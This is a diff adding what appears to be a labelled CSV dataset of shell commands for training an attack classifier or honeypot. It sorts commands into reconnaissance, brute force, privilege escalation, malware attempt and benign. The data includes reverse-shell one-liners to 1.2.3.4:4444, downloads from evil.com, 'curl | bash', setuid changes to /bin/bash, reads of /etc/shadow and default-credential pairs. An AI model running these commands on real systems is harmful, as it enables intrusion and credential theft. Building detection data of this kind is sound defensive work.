@@ -1,0 +1,101 @@
+command,attack_category
+whoami,Reconnaissance
+id,Reconnaissance
+uname,Reconnaissance
+uname -a,Reconnaissance
+pwd,Reconnaissance
+ls,Reconnaissance
+ls -la,Reconnaissance
+ls -la /,Reconnaissance
+ls -l /etc,Reconnaissance
+cat /etc/passwd,Reconnaissance
+cat /etc/shadow,Reconnaissance
+cat /etc/group,Reconnaissance
+ifconfig,Reconnaissance
+ip addr,Reconnaissance
+ip a,Reconnaissance
+netstat -an,Reconnaissance
+netstat -tulpn,Reconnaissance
+netstat -r,Reconnaissance
+hostname,Reconnaissance
+who,Reconnaissance
+w,Reconnaissance
+env,Reconnaissance
+history,Reconnaissance
+cat .bash_history,Reconnaissance
+find / -name passwd,Reconnaissance
+cat /etc/hosts,Reconnaissance
+uptime,Reconnaissance
+df -h,Reconnaissance
+ps aux,Reconnaissance
+ps -ef,Reconnaissance
+free -m,Reconnaissance
+id root,Reconnaissance
+cat /proc/version,Reconnaissance
+uname -r,Reconnaissance
+GET /,Reconnaissance
+GET /wp-admin,Reconnaissance
+GET /admin,Reconnaissance
+USER root,Brute Force
+USER admin,Brute Force
+USER test,Brute Force
+PASS 123456,Brute Force
+PASS password,Brute Force
+PASS admin,Brute Force
+PASS root,Brute Force
+PASS 12345,Brute Force
+PASS qwerty,Brute Force
+auth:root:toor,Brute Force
+auth:admin:admin123,Brute Force
+auth:test:test,Brute Force
+auth:root:password,Brute Force
+auth:ubuntu:ubuntu,Brute Force
+POST /login,Brute Force
+POST /api/login,Brute Force
+sudo su,Privilege Escalation
+sudo -i,Privilege Escalation
+sudo bash,Privilege Escalation
+su root,Privilege Escalation
+su -,Privilege Escalation
+passwd,Privilege Escalation
+passwd root,Privilege Escalation
+chmod 777 /etc/passwd,Privilege Escalation
+chmod 4755 /bin/bash,Privilege Escalation
+chmod +s /bin/bash,Privilege Escalation
+chown root:root,Privilege Escalation
+visudo,Privilege Escalation
+usermod -aG sudo user,Privilege Escalation
+id root,Privilege Escalation
+sudo cat /etc/shadow,Privilege Escalation
+sudo /bin/bash,Privilege Escalation
+wget http://evil.com/shell.sh,Malware Attempt
+curl http://evil.com/backdoor,Malware Attempt
+chmod +x /tmp/x,Malware Attempt
+chmod 777 /tmp/script,Malware Attempt
+base64 -d <<< payload,Malware Attempt
+python -c 'import socket',Malware Attempt
+bash -i >& /dev/tcp/1.2.3.4/4444,Malware Attempt
+/bin/sh -i,Malware Attempt
+nc -e /bin/sh 1.2.3.4 4444,Malware Attempt
+/tmp/backdoor,Malware Attempt
+./malware,Malware Attempt
+cd /tmp && wget,Malware Attempt
+curl | bash,Malware Attempt
+wget -O- http://x | sh,Malware Attempt
+GET /etc/passwd,Malware Attempt
+wget http://x.com/miner,Malware Attempt
+curl -o /tmp/x http://evil.com/x,Malware Attempt
+chmod +x /tmp/*.sh,Malware Attempt
+cd /,Benign
+cd ~,Benign
+cd ..,Benign
+exit,Benign
+quit,Benign
+logout,Benign
+help,Benign
+?,Benign
+clear,Benign
+echo test,Benign
+ll,Benign
+dir,Benign
+list,Benign
